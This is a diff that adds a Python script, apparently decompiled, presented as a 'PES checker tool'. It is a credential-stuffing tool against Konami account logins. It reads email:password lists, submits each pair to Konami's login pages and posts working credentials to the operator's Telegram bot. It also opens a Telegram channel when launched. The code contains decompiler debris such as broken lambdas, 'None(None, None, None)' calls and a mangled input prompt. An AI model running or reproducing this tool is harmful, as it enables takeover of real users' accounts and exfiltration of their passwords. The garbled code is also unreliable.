@@ -1,0 +1,111 @@
+
+
+
+
+import requests
+import os
+import colorama
+import pyfiglet
+from urllib.parse import quote
+colorama.init()
+E = '\x1b[1;31m'
+G = '\x1b[1;32m'
+S = '\x1b[1;33m'
+import webbrowser
+webbrowser.open('https://t.me/thomashack')
+logo = '\x1b[1;39m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\x1b[1;36m\n  \n@@@@@@@   @@@@@@@@   @@@@@@\n@@@@@@@@  @@@@@@@@  @@@@@@@\n@@!  @@@  @@!       !@@\n!@!  @!@  !@!       !@!\n@!@@!@!   @!!!:!    !!@@!!\n!!@!!!    !!!!!:     !!@!!!\n!!:       !!:            !:!\n:!:       :!:           !:!\n ::        :: ::::  :::: ::\n :        : :: ::   :: : :\n\n                           ⠀\n                 < PES CHECKER TOOL >\n              TELE : @PHPMEHMET / @THOMASHACK\n\n\x1b[1;39m ▬▬▬▬▬▬▬▬▬\x1b[1;39m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬'
+print(logo)
+ID = input(f'''{G}[+] ID\Aysel Öztürk ')
+tok = input(f'''{colorama.Fore.CYAN}[+] BOT TOKEN\'ınızı Girin : ''')
+email_file_path = input('E-posta Dosyasının Adını Girin: ')
+proxy_file_path = input('Proxy Dosyasının Adını Girin: ')
+with open(proxy_file_path, 'r') as proxy_file:
+    proxy_list = (lambda .0: [ line.strip() for line in .0 ])(proxy_file)
+    None(None, None, None)
+if not None:
+    pass
+total = 0
+hits = 0
+r = 0
+free = 0
+bad = 0
+
+def mehmet(email, password, proxy):
+    global hits, free, total, bad, r
+    success_message = 'iid?code='
+    failure_messages = [
+        'ter. Vérifiez votre ID de connexion',
+        'se entre 8 et 32 caractère',
+        'Unable to login. Check your Login ID and password again.']
+    url1 = 'https://account.konami.net/connect/?client_id=u745dx9nckm4janoi5zp9x93twa7mgtu&redirect_uri=pesactionmobile%3A%2F%2Fkonaminet.jp%2Fkonamiid&entry=0#'
+    url2 = 'https://account.konami.net/connect/index.html'
+    url3 = 'https://account.konami.net/connect/login.html'
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
+        'Pragma': 'no-cache',
+        'Accept': '*/*' }
+    payload1 = {
+        'topForm': 'topForm',
+        'javax.faces.ViewState': '',
+        'topForm%3Aj_idt52': 'topForm%3Aj_idt52' }
+    payload2 = {
+        'loginForm': 'loginForm',
+        'loginForm%3AuserId': '',
+        'loginForm%3Apassword': '',
+        'loginForm%3Aotp': '',
+        'loginForm%3Aj_idt51': '',
+        'javax.faces.ViewState': '' }
+    
+    try:
+        response1 = requests.get(url1, headers=headers)
+        response1.raise_for_status()
+        value_aa = response1.text.split('<input type="hidden" name="footer-form" value="footer-form" />')[1].split('autocomplete="off" />')[0]
+        payload1['javax.faces.ViewState'] = value_aa.strip()
+        response2 = requests.post(url2, payload1, headers, **('data', 'headers'))
+        response2.raise_for_status()
+        value_t2 = response2.text.split('id="j_id1:javax.faces.ViewState:0" value="')[1].split('"')[0]
+        payload2['javax.faces.ViewState'] = value_t2.strip()
+        payload2['loginForm%3AuserId'] = quote(email)
+        payload2['loginForm%3Apassword'] = quote(password)
+        response3 = requests.post(url3, payload2, headers, False, **('data', 'headers', 'allow_redirects'))
+        if success_message in response3.headers.get('Location', ''):
+            hits += 1
+            free += 1
+            total += 1
+            requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage''', {
+                'chat_id': ID,
+                'text': f''' ✅ Yeni Pes Hesabı Düştü ✅\n.🇹🇷. E-posta ==> {email}\n. 🇹🇷. Şifre ==> {password}\n. 🎁. Tele ==> @phpmehmet'''.encode('utf-8') }, **('data',))
+            os.system('cls' if os.name == 'nt' else 'clear')
+            print(f'''\r[$] Toplam: {total}\n[-] Hit ✅: {hits} | \n[-] Yeniden Denenen❌: {r} | \n[-] Özel🔒: {free} |\n[-] Hata❌: {bad}''', '', **('end',))
+        elif None((lambda .0 = None: for msg in .0:
+msg in response3.text)(failure_messages)):
+            bad += 1
+        else:
+            r += 1
+    except:
+        pass
+    e = None
+    
+    try:
+        print(f'''Hata: {e}''')
+    except:
+        e = None
+        del e
+    e = None
+    del e
+    
+
+
+
+with open(email_file_path, 'r') as file:
+    for line in file:
+        (email, password) = line.strip().split(':')
+        proxy = proxy_list[0]
+        mehmet(email, password, proxy)
+    None(None, None, None)
+if not None:
+    pass
+
+
+
+
